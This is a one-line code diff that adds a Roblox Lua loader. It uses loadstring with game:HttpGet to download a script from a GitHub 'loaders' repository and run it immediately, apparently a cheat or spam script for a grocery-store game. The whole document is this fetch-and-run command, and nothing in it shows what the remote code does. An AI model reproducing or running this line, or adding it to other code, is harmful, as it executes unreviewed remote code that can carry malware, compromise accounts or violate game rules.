@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/eat-everything-in-a-grocery-store-spam5-m6tn6vbbih2x11.lua"))()
